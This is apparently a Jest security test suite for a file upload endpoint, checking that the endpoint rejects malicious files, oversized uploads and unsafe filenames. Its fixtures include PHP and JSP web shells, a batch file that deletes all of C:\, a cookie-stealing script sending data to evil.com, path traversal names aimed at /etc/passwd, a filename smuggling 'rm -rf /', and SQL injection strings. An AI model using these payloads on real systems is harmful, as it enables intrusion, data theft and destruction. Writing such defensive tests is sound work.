/**
 * Task 4.5: File Upload Security Tests (malicious files, size limits, type validation)
 * 
 * This test suite validates file upload security across all upload endpoints:
 * - Malicious file detection and blocking
 * - File type validation and enforcement
 * - File size limits and validation
 * - Filename sanitization
 * - Content scanning and analysis
 * - Path traversal prevention
 * - Executable file blocking
 * - Archive file security
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { server } from '@test-mocks/api/mock-server';

describe('🛡️ Task 4.5: File Upload Security Tests', () => {
  
  beforeEach(() => {
    jest.clearAllMocks();
    global.fetch = server.mockFetch;
    server.listen({ onUnhandledRequest: 'error' });
  });

  afterEach(() => {
    server.resetHandlers();
    jest.restoreAllMocks();
  });

  afterAll(() => {
    server.close();
  });

  describe('🦠 Malicious File Detection', () => {
    const maliciousFileContents = [
      // Script files with malicious content
      {
        name: 'malware.js',
        content: 'eval(atob("YWxlcnQoJ1hTUycpOw=="))', // alert('XSS')
        type: 'application/javascript'
      },
      {
        name: 'virus.php',
        content: '<?php system($_GET["cmd"]); ?>',
        type: 'application/x-httpd-php'
      },
      {
        name: 'backdoor.jsp',
        content: '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
        type: 'application/x-jsp'
      },
      
      // Executable files
      {
        name: 'malware.exe',
        content: 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00', // PE header
        type: 'application/x-msdownload'
      },
      {
        name: 'trojan.bat',
        content: '@echo off\ndel /s /q C:\\*.*',
        type: 'application/x-bat'
      },
      
      // Archive bombs
      {
        name: 'bomb.zip',
        content: new Array(1000).join('A'), // Simulated zip bomb
        type: 'application/zip'
      },
      
      // SVG with embedded scripts
      {
        name: 'xss.svg',
        content: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
        type: 'image/svg+xml'
      },
      
      // HTML with malicious content
      {
        name: 'phishing.html',
        content: '<html><script>window.location="http://evil.com/steal?data="+document.cookie</script></html>',
        type: 'text/html'
      },
      
      // Office documents with macros (simulated)
      {
        name: 'macro.docx',
        content: 'PK\x03\x04macro_content_with_vba_payload',
        type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
      }
    ];

    it('should block malicious executable files', async () => {
      for (const file of maliciousFileContents) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        // Should reject malicious files
        expect([400, 403, 415]).toContain(response.status);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.error).toMatch(/file type|not allowed|security|malicious|prohibited/i);
        }
      }
    });

    it('should detect and block files with dangerous extensions', async () => {
      const dangerousExtensions = [
        'exe', 'bat', 'cmd', 'com', 'pif', 'scr', 'vbs', 'vbe',
        'js', 'jse', 'ws', 'wsf', 'wsh', 'ps1', 'ps1xml', 'ps2',
        'ps2xml', 'psc1', 'psc2', 'msh', 'msh1', 'msh2', 'mshxml',
        'msh1xml', 'msh2xml', 'scf', 'lnk', 'inf', 'reg', 'php',
        'asp', 'aspx', 'jsp', 'py', 'pl', 'rb', 'sh'
      ];

      for (const ext of dangerousExtensions) {
        const filename = `malicious.${ext}`;
        const formData = new FormData();
        formData.append('file', new Blob(['malicious content'], { type: 'text/plain' }), filename);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        expect([400, 403, 415]).toContain(response.status);
      }
    });

    it('should detect disguised executables', async () => {
      const disguisedFiles = [
        {
          name: 'document.pdf.exe',
          content: 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00',
          type: 'application/pdf'
        },
        {
          name: 'image.jpg.bat',
          content: '@echo off\necho hacked',
          type: 'image/jpeg'
        },
        {
          name: 'data.txt.vbs',
          content: 'WScript.Shell.Run "cmd.exe"',
          type: 'text/plain'
        },
        {
          name: 'normal.docx',
          content: 'MZ\x90\x00\x03', // PE header in a Word document
          type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        }
      ];

      for (const file of disguisedFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        expect([400, 403, 415]).toContain(response.status);
      }
    });
  });

  describe('📄 File Type Validation', () => {
    const allowedFileTypes = [
      { name: 'document.pdf', content: '%PDF-1.4', type: 'application/pdf' },
      { name: 'document.docx', content: 'PK\x03\x04', type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' },
      { name: 'document.txt', content: 'This is a text file', type: 'text/plain' },
      { name: 'image.jpg', content: '\xFF\xD8\xFF\xE0', type: 'image/jpeg' },
      { name: 'image.png', content: '\x89PNG\r\n\x1a\n', type: 'image/png' }
    ];

    const disallowedFileTypes = [
      { name: 'script.js', content: 'alert("xss")', type: 'application/javascript' },
      { name: 'page.html', content: '<html><script>alert("xss")</script></html>', type: 'text/html' },
      { name: 'executable.exe', content: 'MZ\x90\x00', type: 'application/x-msdownload' },
      { name: 'archive.rar', content: 'Rar!\x1a\x07\x00', type: 'application/x-rar-compressed' }
    ];

    it('should accept only allowed file types', async () => {
      for (const file of allowedFileTypes) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        // Should accept valid file types
        expect([200, 201]).toContain(response.status);
      }
    });

    it('should reject disallowed file types', async () => {
      for (const file of disallowedFileTypes) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        expect([400, 403, 415]).toContain(response.status);
      }
    });

    it('should validate file content matches declared type (magic number validation)', async () => {
      const mismatchedFiles = [
        {
          name: 'fake.pdf',
          content: '<html><script>alert("fake pdf")</script></html>',
          type: 'application/pdf'
        },
        {
          name: 'fake.jpg',
          content: 'MZ\x90\x00\x03\x00\x00\x00\x04', // PE header claiming to be JPEG
          type: 'image/jpeg'
        },
        {
          name: 'fake.docx',
          content: '<?php system($_GET["cmd"]); ?>',
          type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        }
      ];

      for (const file of mismatchedFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        expect([400, 403, 415]).toContain(response.status);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.error).toMatch(/file type|content|mismatch|invalid/i);
        }
      }
    });
  });

  describe('📏 File Size Validation', () => {
    it('should enforce maximum file size limits', async () => {
      const oversizedContent = 'A'.repeat(100 * 1024 * 1024); // 100MB
      
      const formData = new FormData();
      formData.append('file', new Blob([oversizedContent], { type: 'text/plain' }), 'large.txt');

      const response = await fetch('/api/upload', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer valid-token' },
        body: formData
      });

      expect([400, 413]).toContain(response.status);
      
      if (!response.ok) {
        const data = await response.json();
        expect(data.error).toMatch(/file size|too large|limit exceeded/i);
      }
    });

    it('should reject empty files', async () => {
      const formData = new FormData();
      formData.append('file', new Blob([''], { type: 'text/plain' }), 'empty.txt');

      const response = await fetch('/api/upload', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer valid-token' },
        body: formData
      });

      expect([400]).toContain(response.status);
      
      if (!response.ok) {
        const data = await response.json();
        expect(data.error).toMatch(/empty|file size|invalid/i);
      }
    });

    it('should handle different size limits for different file types', async () => {
      const files = [
        {
          name: 'large_image.jpg',
          content: '\xFF\xD8\xFF\xE0' + 'A'.repeat(20 * 1024 * 1024), // 20MB image
          type: 'image/jpeg'
        },
        {
          name: 'large_document.pdf',
          content: '%PDF-1.4' + 'A'.repeat(50 * 1024 * 1024), // 50MB PDF
          type: 'application/pdf'
        }
      ];

      for (const file of files) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        // Response depends on configured limits for each type
        expect([200, 201, 400, 413]).toContain(response.status);
      }
    });
  });

  describe('📂 Filename Security', () => {
    const maliciousFilenames = [
      // Path traversal attempts
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'file/../../../sensitive.txt',
      'normal.txt/../../../etc/shadow',
      
      // Null byte injection
      'file.txt\x00.exe',
      'document.pdf\x00malware.bat',
      
      // Special characters
      'file<script>alert("xss")</script>.txt',
      'file"; rm -rf /; #.txt',
      'CON.txt', // Windows reserved name
      'PRN.txt', // Windows reserved name
      'AUX.txt', // Windows reserved name
      
      // Unicode and encoding attacks
      'file\u200B.txt', // Zero-width space
      'file\uFEFF.txt', // Byte order mark
      'file%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      
      // Long filenames
      'A'.repeat(300) + '.txt',
      
      // Control characters
      'file\r\n.txt',
      'file\t.txt',
      'file\x01.txt'
    ];

    it('should sanitize malicious filenames', async () => {
      for (const filename of maliciousFilenames) {
        const formData = new FormData();
        formData.append('file', new Blob(['test content'], { type: 'text/plain' }), filename);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        if (response.ok) {
          const data = await response.json();
          const uploadedFilename = data.filename || '';
          
          // Verify filename was sanitized
          expect(uploadedFilename).not.toContain('../');
          expect(uploadedFilename).not.toContain('..\\');
          expect(uploadedFilename).not.toContain('\x00');
          expect(uploadedFilename).not.toContain('<script>');
          expect(uploadedFilename).not.toMatch(/CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9]/i);
        } else {
          // Alternatively, reject malicious filenames
          expect([400, 403]).toContain(response.status);
        }
      }
    });

    it('should prevent directory traversal in file paths', async () => {
      const traversalAttempts = [
        '../../../../etc/passwd',
        '..\\..\\..\\..\\windows\\system32\\config\\sam',
        'uploads/../../../sensitive/file.txt',
        '/etc/passwd',
        'C:\\windows\\system32\\config\\sam'
      ];

      for (const path of traversalAttempts) {
        const formData = new FormData();
        formData.append('file', new Blob(['test'], { type: 'text/plain' }), 'normal.txt');
        formData.append('path', path);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        expect([400, 403]).toContain(response.status);
      }
    });
  });

  describe('🗜️ Archive File Security', () => {
    it('should prevent zip bombs and decompression attacks', async () => {
      // Simulated zip bomb (high compression ratio)
      const zipBombContent = new Array(10000).join('A'); // Highly compressible content
      
      const formData = new FormData();
      formData.append('file', new Blob([zipBombContent], { type: 'application/zip' }), 'bomb.zip');

      const response = await fetch('/api/upload', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer valid-token' },
        body: formData
      });

      // Should either reject or have strict decompression limits
      if (!response.ok) {
        expect([400, 403, 413]).toContain(response.status);
      }
    });

    it('should scan archive contents for malicious files', async () => {
      // Mock archive with malicious content
      const maliciousArchive = 'PK\x03\x04malware.exe\x00virus.php\x00trojan.bat';
      
      const formData = new FormData();
      formData.append('file', new Blob([maliciousArchive], { type: 'application/zip' }), 'archive.zip');

      const response = await fetch('/api/upload', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer valid-token' },
        body: formData
      });

      expect([400, 403]).toContain(response.status);
      
      if (!response.ok) {
        const data = await response.json();
        expect(data.error).toMatch(/malicious|prohibited|security/i);
      }
    });
  });

  describe('🔒 Upload Endpoint Security', () => {
    it('should require authentication for file uploads', async () => {
      const formData = new FormData();
      formData.append('file', new Blob(['test'], { type: 'text/plain' }), 'test.txt');

      const response = await fetch('/api/upload', {
        method: 'POST',
        body: formData
      });

      expect([401, 403]).toContain(response.status);
    });

    it('should validate file upload permissions', async () => {
      const formData = new FormData();
      formData.append('file', new Blob(['test'], { type: 'text/plain' }), 'test.txt');

      const response = await fetch('/api/upload', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer invalid_token' },
        body: formData
      });

      expect([401, 403]).toContain(response.status);
    });

    it('should prevent file overwrite attacks', async () => {
      const formData = new FormData();
      formData.append('file', new Blob(['malicious content'], { type: 'text/plain' }), 'config.ini');

      const response = await fetch('/api/upload', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer valid-token' },
        body: formData
      });

      if (response.ok) {
        const data = await response.json();
        // Should not overwrite system files
        expect(data.filename).not.toBe('config.ini');
        expect(data.path).not.toMatch(/config|system|admin/i);
      }
    });

    it('should implement rate limiting for file uploads', async () => {
      const uploadPromises = [];
      
      // Attempt multiple rapid uploads
      for (let i = 0; i < 20; i++) {
        const formData = new FormData();
        formData.append('file', new Blob(['test'], { type: 'text/plain' }), `test${i}.txt`);
        
        uploadPromises.push(
          fetch('/api/upload', {
            method: 'POST',
            headers: { 'Authorization': 'Bearer valid-token' },
            body: formData
          })
        );
      }

      const responses = await Promise.all(uploadPromises);
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      
      // Should rate limit excessive uploads
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('🔍 Content Analysis Security', () => {
    it('should scan for embedded malicious content', async () => {
      const suspiciousContents = [
        // Base64 encoded payloads
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
        
        // URL with suspicious patterns
        'http://evil.com/malware.exe',
        'https://malicious-site.com/steal-data',
        
        // Suspicious code patterns
        'eval(atob(',
        'document.write(',
        'System.exec(',
        'Runtime.getRuntime().exec(',
        
        // SQL injection patterns in text files
        "'; DROP TABLE users; --",
        'UNION SELECT password FROM users'
      ];

      for (const content of suspiciousContents) {
        const formData = new FormData();
        formData.append('file', new Blob([content], { type: 'text/plain' }), 'suspicious.txt');

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        // Should either reject or quarantine suspicious content
        if (!response.ok) {
          expect([400, 403]).toContain(response.status);
        }
      }
    });

    it('should detect and block steganography attempts', async () => {
      // Mock image with hidden data
      const imageWithHiddenData = '\xFF\xD8\xFF\xE0\x00\x10JFIF' + 'hidden_malicious_payload_in_image_metadata';
      
      const formData = new FormData();
      formData.append('file', new Blob([imageWithHiddenData], { type: 'image/jpeg' }), 'steganography.jpg');

      const response = await fetch('/api/upload', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer valid-token' },
        body: formData
      });

      // Advanced security should detect steganography
      if (!response.ok) {
        expect([400, 403]).toContain(response.status);
      }
    });
  });
}); 